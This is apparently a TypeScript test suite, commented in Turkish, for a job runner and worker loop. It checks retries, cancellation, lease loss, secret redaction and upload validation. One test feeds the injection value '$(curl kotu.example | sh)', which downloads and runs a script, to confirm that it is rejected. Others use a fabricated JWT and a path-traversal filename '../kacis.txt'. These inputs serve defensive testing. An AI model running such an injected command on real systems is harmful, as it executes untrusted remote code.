import assert from 'node:assert/strict';
import { existsSync, mkdtempSync, rmSync } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { after, test } from 'node:test';
import { setTimeout as delay } from 'node:timers/promises';
import { z } from 'zod';
import { createFakeApi } from '../testing/fake-api.ts';
import { PermanentError, TransientError } from './errors.ts';
import { defaultRegistry } from './handlers.ts';
import { createMemoryLogger } from './log.ts';
import {
  JOB_KINDS,
  createRegistry,
  defineJobKind,
  type StageHandler,
} from './registry.ts';
import { SHUTDOWN_MESSAGE, runJob, type RunnerDeps } from './runner.ts';
import { createWorker } from './worker.ts';

const workDir = mkdtempSync(path.join(os.tmpdir(), 'aiw-runner-'));
after(() => rmSync(workDir, { recursive: true, force: true }));

const SELFTEST = {
  kind: 'clip.selftest',
  stages: JOB_KINDS['clip.selftest'].stages.map((stage) => ({ ...stage })),
  required: ['kind:clip.selftest'],
};
const fast = { steps: 2, stepMs: 5 };

function setup(registry = defaultRegistry()) {
  const fake = createFakeApi();
  const log = createMemoryLogger();
  const shutdown = new AbortController();
  const deps = (workerId: string): RunnerDeps => ({
    api: fake.api,
    registry,
    log,
    workerId,
    leaseSeconds: 30,
    workDir,
    shutdown: shutdown.signal,
    sleep: async () => undefined,
    progressThrottleMs: 0,
    renewIntervalMs: 20,
  });
  const claim = async () => {
    const worker = await fake.api.registerWorker({
      name: 'test',
      platform: 'linux',
      version: '0',
      capabilities: registry.capabilities(),
    });
    const job = await fake.api.claimJob(worker.id, 30);
    assert.ok(job, 'iş alınmalı');
    return { worker, job };
  };
  return { fake, log, shutdown, deps, claim };
}

/** Tek aşamalı sahte tür: `clip.selftest` adını kullanır, işleyicileri testten gelir. */
function registryWith(
  handlers: Partial<
    Record<'prepare' | 'review' | 'finish', StageHandler<unknown>>
  >,
) {
  const noop: StageHandler<unknown> = async () => ({});
  return createRegistry([
    defineJobKind({
      kind: 'clip.selftest',
      params: z.unknown(),
      stages: { prepare: noop, review: noop, finish: noop, ...handlers },
    }),
  ]);
}

test('uçtan uca: 1. aşama → onay aşamasında durur → onaydan sonra tamamlanır', async () => {
  const { fake, deps, claim } = setup();
  const job = fake.enqueue({
    ...SELFTEST,
    params: { ...fast, note: 'merhaba' },
  });
  const first = await claim();
  assert.equal(await runJob(deps(first.worker.id), first.job), 'advanced');
  assert.equal(job.status, 'awaiting_approval');
  assert.deepEqual(
    job.stages.map((stage) => stage.status),
    ['succeeded', 'succeeded', 'pending'],
  );
  assert.match(String(job.stages[0]!.output?.node), /^v\d+\./);
  assert.deepEqual(job.uploads, [
    {
      fileName: 'selftest.txt',
      role: 'other',
      stage: 'review',
      size: job.uploads[0]!.size,
      contentType: 'text/plain',
    },
  ]);
  assert.equal(job.stages[1]!.progress, 100);
  // Makine onay bekleyen işi alamaz
  assert.equal(await fake.api.claimJob(first.worker.id, 30), null);

  fake.approve(job);
  const second = await claim();
  assert.equal(second.job.current_stage, 'finish');
  assert.equal(await runJob(deps(second.worker.id), second.job), 'advanced');
  assert.equal(job.status, 'succeeded');
  assert.equal(
    existsSync(path.join(workDir, job.id)),
    false,
    'geçici klasör silinmeli',
  );
});

test('geçici hata işi kuyruğa döndürür; kalıcı hata ve geçersiz parametre işi bitirir', async () => {
  const transient = setup();
  const retried = transient.fake.enqueue({
    ...SELFTEST,
    params: { ...fast, failAt: 'prepare' },
  });
  let turn = await transient.claim();
  assert.equal(
    await runJob(transient.deps(turn.worker.id), turn.job),
    'released',
  );
  assert.equal(retried.status, 'queued');
  assert.equal(retried.attempts, 1);
  assert.match(retried.error ?? '', /geçici hata/);
  // Deneme hakkı bitince hata kalıcılaşır
  turn = await transient.claim();
  assert.equal(
    await runJob(transient.deps(turn.worker.id), turn.job),
    'released',
  );
  turn = await transient.claim();
  assert.equal(
    await runJob(transient.deps(turn.worker.id), turn.job),
    'failed',
  );
  assert.equal(retried.status, 'failed');

  const permanent = setup();
  const failed = permanent.fake.enqueue({
    ...SELFTEST,
    params: { ...fast, failAt: 'prepare', failMode: 'permanent' },
  });
  turn = await permanent.claim();
  assert.equal(
    await runJob(permanent.deps(turn.worker.id), turn.job),
    'failed',
  );
  assert.equal(failed.attempts, 1);

  const invalid = setup();
  const rejected = invalid.fake.enqueue({
    ...SELFTEST,
    params: { steps: 3, command: '$(curl kotu.example | sh)' },
  });
  turn = await invalid.claim();
  assert.equal(await runJob(invalid.deps(turn.worker.id), turn.job), 'failed');
  assert.match(rejected.error ?? '', /İş parametreleri geçersiz/);
  assert.equal(
    (rejected.error ?? '').includes('curl'),
    false,
    'girilen değer hata metnine taşınmaz',
  );
  assert.equal(rejected.stages[0]!.status, 'failed');
});

test('işleyici hata metnindeki sır veritabanına yazılmaz', async () => {
  const jwt =
    // Parçalardan kurulur: depoda gerçek token'a benzeyen bir sabit durmasın (secret taraması)
    [
      'eyJhbGciOiJIUzI1NiJ9',
      'eyJzdWIiOiIxMjM0NTY3ODkwIn0',
      'c2lnbmF0dXJlLWJ5dGVz',
    ].join('.');
  const env = setup(
    registryWith({
      prepare: async () => {
        throw new PermanentError(
          `yükleme reddedildi: Bearer ${jwt}\n  at dosya.ts:1`,
        );
      },
    }),
  );
  const job = env.fake.enqueue(SELFTEST);
  const turn = await env.claim();
  assert.equal(await runJob(env.deps(turn.worker.id), turn.job), 'failed');
  assert.equal(job.error, 'yükleme reddedildi: Bearer [gizli] at dosya.ts:1');
  assert.equal(env.log.lines.join('\n').includes(jwt), false);
});

test('iptal: işleyici durdurulur ve iptal onaylanır', async () => {
  let aborted = false;
  const env = setup(
    registryWith({
      prepare: async (context) => {
        context.progress(10, 'başladı');
        await new Promise<void>((resolve) => {
          context.signal.addEventListener('abort', () => {
            aborted = true;
            resolve();
          });
        });
        throw new TransientError('durduruldu');
      },
    }),
  );
  const job = env.fake.enqueue(SELFTEST);
  const turn = await env.claim();
  const running = runJob(env.deps(turn.worker.id), turn.job);
  await delay(40);
  env.fake.requestCancel(job);
  assert.equal(await running, 'cancelled');
  assert.equal(aborted, true);
  assert.equal(job.status, 'cancelled');
  assert.equal(
    env.fake.calls.includes('fail_stage'),
    false,
    'iptal hata olarak bildirilmez',
  );
  assert.equal(env.fake.calls.at(-1), 'acknowledge_cancel');
});

test('iptal aşama başlamadan istenmişse işleyici hiç çalışmaz', async () => {
  let ran = false;
  const env = setup(registryWith({ prepare: async () => void (ran = true) }));
  const job = env.fake.enqueue(SELFTEST);
  const turn = await env.claim();
  env.fake.requestCancel(job);
  assert.equal(await runJob(env.deps(turn.worker.id), turn.job), 'cancelled');
  assert.equal(ran, false);
});

test('kira kaybı: işleyici durdurulur, başka çağrı yapılmaz', async () => {
  let aborted = false;
  const env = setup(
    registryWith({
      prepare: async (context) => {
        await new Promise<void>((resolve) =>
          context.signal.addEventListener('abort', () => {
            aborted = true;
            resolve();
          }),
        );
      },
    }),
  );
  const job = env.fake.enqueue(SELFTEST);
  const turn = await env.claim();
  const running = runJob(env.deps(turn.worker.id), turn.job);
  await delay(40);
  // İş başka makineye geçti
  job.worker_id = 'baska-makine';
  assert.equal(await running, 'lease_lost');
  assert.equal(aborted, true);
  assert.equal(env.fake.calls.includes('complete_stage'), false);
  assert.equal(env.fake.calls.includes('fail_stage'), false);
});

test('yetki kaldırılınca iş bırakılır ve sonuç "revoked" olur', async () => {
  const env = setup(
    registryWith({
      prepare: async (context) => {
        await new Promise<void>((resolve) =>
          context.signal.addEventListener('abort', () => resolve()),
        );
      },
    }),
  );
  env.fake.enqueue(SELFTEST);
  const turn = await env.claim();
  const running = runJob(env.deps(turn.worker.id), turn.job);
  await delay(40);
  env.fake.state.revoked = true;
  assert.equal(await running, 'revoked');
});

test('kapanış: süren aşama durur ve iş kuyruğa bırakılır', async () => {
  const env = setup(
    registryWith({
      prepare: async (context) => {
        await new Promise<void>((resolve) =>
          context.signal.addEventListener('abort', () => resolve()),
        );
      },
    }),
  );
  const job = env.fake.enqueue(SELFTEST);
  const turn = await env.claim();
  const running = runJob(env.deps(turn.worker.id), turn.job);
  await delay(30);
  env.shutdown.abort();
  assert.equal(await running, 'released');
  assert.equal(job.status, 'queued');
  assert.equal(job.error, SHUTDOWN_MESSAGE);
  assert.equal(job.stages[0]!.status, 'pending');
});

test('geçici RPC hatası yeniden denenir; ilerleme seyreltilir ve kira uzar', async () => {
  const env = setup();
  const job = env.fake.enqueue({
    ...SELFTEST,
    params: { steps: 6, stepMs: 10 },
  });
  const turn = await env.claim();
  env.fake.state.failNext.set('start_stage', 2);
  env.fake.state.failNext.set('complete_stage', 1);
  env.fake.state.failNext.set('report_progress', 1);
  assert.equal(await runJob(env.deps(turn.worker.id), turn.job), 'advanced');
  assert.equal(job.status, 'awaiting_approval');
  assert.equal(
    env.fake.calls.filter((name) => name === 'start_stage').length,
    4,
  );
  assert.ok(
    env.fake.calls.filter((name) => name === 'report_progress').length >= 2,
  );
});

test('işleyicisi olmayan aşama ve geçersiz çıktı', async () => {
  const empty = setup(createRegistry([]));
  const orphan = empty.fake.enqueue({ ...SELFTEST, required: [] });
  let turn = await empty.claim();
  assert.equal(await runJob(empty.deps(turn.worker.id), turn.job), 'released');
  assert.match(orphan.error ?? '', /işleyicisi yok/);

  const big = setup(
    registryWith({ prepare: async () => ({ veri: 'x'.repeat(10_000) }) }),
  );
  const job = big.fake.enqueue(SELFTEST);
  turn = await big.claim();
  assert.equal(await runJob(big.deps(turn.worker.id), turn.job), 'failed');
  assert.match(job.error ?? '', /çıktısı geçersiz/);
});

test('yükleme kuralları: ad, rol, tür ve boyut işleyicide denetlenir', async () => {
  const attempts: [string, string, string, number][] = [
    ['../kacis.txt', 'other', 'text/plain', 1],
    ['a.txt', 'poster', 'text/plain', 1],
    ['a.exe', 'other', 'application/x-msdownload', 1],
    ['a.txt', 'other', 'text/plain', 6 * 1024 * 1024],
  ];
  for (const [fileName, role, contentType, size] of attempts) {
    const env = setup(
      registryWith({
        prepare: async (context) => {
          await context.attach({
            fileName,
            role: role as never,
            contentType,
            body: new Uint8Array(size),
          });
        },
      }),
    );
    const job = env.fake.enqueue(SELFTEST);
    const turn = await env.claim();
    assert.equal(
      await runJob(env.deps(turn.worker.id), turn.job),
      'failed',
      fileName,
    );
    assert.deepEqual(job.uploads, []);
  }
});

// ── Ana döngü ────────────────────────────────────────────────────────────────
function worker(
  fake: ReturnType<typeof createFakeApi>,
  overrides: Partial<Parameters<typeof createWorker>[0]> = {},
) {
  const log = createMemoryLogger();
  return {
    log,
    worker: createWorker({
      api: fake.api,
      registry: defaultRegistry(),
      log,
      name: 'test',
      platform: 'linux',
      version: '0.1.0',
      capabilities: async () => ['voice.edge-tts'],
      pollMs: 10,
      heartbeatMs: 15,
      leaseSeconds: 30,
      workDir,
      runner: { progressThrottleMs: 0, renewIntervalMs: 20 },
      ...overrides,
    }),
  };
}

test('döngü: kaydolur, yetenek bildirir, işi yürütür, boşta kalınca çıkar', async () => {
  const fake = createFakeApi();
  const job = fake.enqueue({ ...SELFTEST, params: fast });
  const foreign = fake.enqueue({ ...SELFTEST, required: ['render.blender'] });
  const { worker: instance } = worker(fake, { exitWhenIdle: true });
  assert.equal(instance.state().phase, 'starting');
  assert.equal(await instance.run(), 'idle');
  assert.deepEqual(fake.state.worker?.capabilities, [
    'kind:clip.selftest',
    'voice.edge-tts',
  ]);
  assert.equal(job.status, 'awaiting_approval');
  assert.equal(foreign.status, 'queued', 'yeteneği yetmeyen iş alınmaz');
  assert.equal(instance.state().phase, 'stopped');
});

test('döngü: durdurulunca süren iş kuyruğa döner ve döngü biter', async () => {
  const fake = createFakeApi();
  const job = fake.enqueue({ ...SELFTEST, params: { steps: 50, stepMs: 100 } });
  const { worker: instance } = worker(fake);
  const running = instance.run();
  for (let i = 0; i < 100 && instance.state().phase !== 'working'; i++)
    await delay(10);
  assert.equal(instance.state().phase, 'working');
  assert.equal(instance.state().jobId, job.id);
  await delay(50);
  instance.stop();
  assert.equal(instance.state().phase, 'stopping');
  assert.equal(await running, 'stopped');
  assert.equal(job.status, 'queued');
  assert.equal(job.error, SHUTDOWN_MESSAGE);
  assert.ok(fake.state.heartbeats >= 1, 'kalp atışı gönderilmiş olmalı');
  instance.stop(); // ikinci durdurma zararsız
});

test('döngü: geçici hatalarda sürer, yetki kaldırılınca durur', async () => {
  const fake = createFakeApi();
  fake.state.failNext.set('register_worker', 2);
  fake.state.failNext.set('claim_job', 2);
  const { worker: instance, log } = worker(fake, {
    sleep: async () => delay(1),
  });
  const running = instance.run();
  for (
    let i = 0;
    i < 200 && fake.calls.filter((name) => name === 'claim_job').length < 4;
    i++
  )
    await delay(5);
  assert.equal(instance.state().phase, 'idle');
  fake.state.revoked = true;
  assert.equal(await running, 'revoked');
  assert.match(log.lines.join('\n'), /yeniden denenecek/);
});
